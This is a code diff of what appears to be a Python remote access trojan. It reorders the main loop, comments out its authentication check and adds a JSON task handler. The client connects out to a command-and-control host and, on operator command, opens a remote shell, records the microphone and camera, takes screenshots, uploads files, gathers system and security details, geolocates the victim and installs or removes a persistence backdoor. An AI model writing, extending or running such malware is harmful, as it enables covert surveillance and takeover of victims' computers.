@@ -234,54 +234,6 @@ def sendInput(conn):
     value = f"{prefix}-{path_info}\n{suffix}"
     send_data(conn, value.encode())
 
-def main():
-    startup_executed = False
-    while True:
-        if not startup_executed:
-            try:
-                exploit.run_all_registered()
-            except Exception:
-                pass
-            startup_executed = True
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((HOST, PORT))
-            if recv_command(s) != auth_code: break
-            send_data(s, b'UNSTAGED')
-            while True:
-                try:
-                    cmd = recv_command(s)
-                    print("CMD: " + cmd)
-                    if cmd == "MODE_SHELL":
-                        handle_shell(s)
-                    elif cmd == "MODE_MIC":
-                        handle_mic(s)
-                    elif cmd == "MODE_UPLOAD":
-                        handle_upload(s)
-                    elif cmd == "MODE_CAM":
-                        handle_cam(s)
-                    elif cmd == "MODE_GEO":
-                        handle_geo(s)
-                    elif cmd == "MODE_REGISTER_POSTEXPLOIT":
-                        handle_register_post_exploit(s)
-                    elif cmd == "MODE_START_POSTEXPLOIT":
-                        handle_start_post_exploit(s)
-                    elif cmd == "MODE_BACKDOOR":
-                        add_persistence(s)
-                    elif cmd == "MODE_DEL":
-                        del_persistence(s)
-                    elif cmd == "MODE_NOTIFICATION":
-                        notification_data = json_receive(s)
-                        send_notification(s, notification_data["title"], notification_data["message"], notification_data["app"])
-                    elif cmd == "MODE_SCREENSHOT":
-                        get_screenshot(s)
-                    elif cmd == "MODE_SECINFO":
-                        get_security_info(s)
-                    elif cmd == "MODE_SYSINFO":
-                        get_system_info(s)
-                except ConnectionError: break
-        except: pass
-
 def download_post_exploit_command(conn):
     send_data(conn, b'control')
     path = handle_upload(conn, getName=True)
@@ -499,6 +451,87 @@ class Exploit:
 
 exploit = Exploit()
 
+def main():
+    startup_executed = False
+    while True:
+        if not startup_executed:
+            try:
+                exploit.run_all_registered()
+            except Exception:
+                pass
+            startup_executed = True
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((HOST, PORT))
+            # if recv_command(s) != auth_code: break
+            send_data(s, b'UNSTAGED')
+            while True:
+                try:
+                    cmd = recv_command(s)
+                    # Support structured JSON tasks defined by api.connection_protocol.create_task
+                    try:
+                        task_obj = json.loads(cmd)
+                        if isinstance(task_obj, dict) and 'module' in task_obj:
+                            module = task_obj.get('module')
+                            action = task_obj.get('action')
+                            args = task_obj.get('args', {}) or {}
+                            # Map protocol tasks to existing handlers
+                            if module == 'notification' and action == 'send':
+                                send_notification(s, args.get('title'), args.get('message'), args.get('app'))
+                                continue
+                            if module == 'geo' and action == 'get':
+                                try:
+                                    r = requests.get('https://ipinfo.io/json')
+                                    json_send(s, {'result': r.text})
+                                except:
+                                    json_send(s, {'error': 'failed'})
+                                continue
+                            if module == 'secinfo' and action == 'get':
+                                get_security_info(s)
+                                continue
+                            if module == 'sysinfo' and action == 'get':
+                                get_system_info(s)
+                                continue
+                            if module == 'system' and action in ('backdoor','delete'):
+                                if action == 'backdoor':
+                                    add_persistence(s)
+                                else:
+                                    del_persistence(s)
+                                json_send(s, {'result': 'completed'})
+                                continue
+                            # Unknown structured task -> fall back to old handling
+                    except Exception:
+                        pass
+                    print("CMD: " + cmd)
+                    if cmd == "MODE_SHELL":
+                        handle_shell(s)
+                    elif cmd == "MODE_MIC":
+                        handle_mic(s)
+                    elif cmd == "MODE_UPLOAD":
+                        handle_upload(s)
+                    elif cmd == "MODE_CAM":
+                        handle_cam(s)
+                    elif cmd == "MODE_GEO":
+                        handle_geo(s)
+                    elif cmd == "MODE_REGISTER_POSTEXPLOIT":
+                        handle_register_post_exploit(s)
+                    elif cmd == "MODE_START_POSTEXPLOIT":
+                        handle_start_post_exploit(s)
+                    elif cmd == "MODE_BACKDOOR":
+                        add_persistence(s)
+                    elif cmd == "MODE_DEL":
+                        del_persistence(s)
+                    elif cmd == "MODE_NOTIFICATION":
+                        notification_data = json_receive(s)
+                        send_notification(s, notification_data["title"], notification_data["message"], notification_data["app"])
+                    elif cmd == "MODE_SCREENSHOT":
+                        get_screenshot(s)
+                    elif cmd == "MODE_SECINFO":
+                        get_security_info(s)
+                    elif cmd == "MODE_SYSINFO":
+                        get_system_info(s)
+                except ConnectionError: break
+        except: pass
 
 if(use_app):
     run(filename=fileName)
